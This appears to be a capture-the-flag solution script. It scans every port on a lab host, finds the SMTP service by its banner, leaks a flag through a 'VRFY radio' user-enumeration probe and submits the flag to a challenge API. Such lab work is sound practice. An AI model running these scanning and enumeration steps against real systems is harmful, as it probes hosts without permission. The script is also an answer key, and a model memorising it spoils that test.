#!/bin/sh
set -eu

target=172.20.0.141
scan=$(nmap -n -Pn -p- --open --min-rate 1000 -oG - "$target")
ports=$(printf '%s\n' "$scan" | python3 -c 'import re,sys; s=sys.stdin.read(); m=re.search(r"Ports: (.*)", s); print(" ".join(re.findall(r"(\d+)/open/tcp", m.group(1))) if m else "")')

smtp_port=
for port in $ports; do
    banner=$(ncat -w 2 "$target" "$port" </dev/null 2>/dev/null || true)
    case "$banner" in
        220\ *) smtp_port=$port; break ;;
    esac
done

if [ -z "$smtp_port" ]; then
    echo "Could not identify the rig's mail service" >&2
    exit 1
fi

reply=$(printf 'VRFY radio\r\nQUIT\r\n' | ncat -w 3 "$target" "$smtp_port")
flag=$(printf '%s\n' "$reply" | python3 -c 'import re,sys; m=re.search(r"BSY\{[^}]+\}", sys.stdin.read()); print(m.group(0) if m else "")')
if [ -z "$flag" ]; then
    echo "The service reply did not contain a flag" >&2
    exit 1
fi
payload=$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":"scl-challenge-frame-806238","task_id":"task1","flag":sys.argv[1]}))' "$flag")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
